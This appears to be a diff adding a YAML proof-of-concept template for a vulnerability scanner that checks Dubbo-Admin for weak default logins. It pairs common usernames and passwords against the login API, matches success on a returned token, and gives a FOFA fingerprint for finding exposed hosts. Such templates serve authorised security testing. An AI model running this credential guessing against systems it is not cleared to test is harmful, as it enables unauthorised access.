@@ -1,0 +1,36 @@
+id: poc-yaml-dubbo-admin-default-passwd
+info:
+  name: Dubbo-Admin 弱口令登录
+  severity: high
+  tags:
+  - 弱口令
+  finger: Dubbo
+  fofa: icon_hash="-819952321"
+variables:
+  name: 'root
+
+    admin
+
+    guest
+
+    '
+  passwd: 'root
+
+    admin
+
+    guest
+
+    123456
+
+    admin123
+
+    '
+firstRequest:
+  method: GET
+  path: /api/dev/user/login?userName=&password=
+  expression: "status_code == 401 && \nbody == \"\"\n"
+requests:
+- method: GET
+  path: /api/dev/user/login?userName={{.name}}&password={{.passwd}}
+  expression: "status_code == 200 && \ncontains(body,\"eyJhbGciOiJIUzUxMiJ9\")\n"
+transport: http
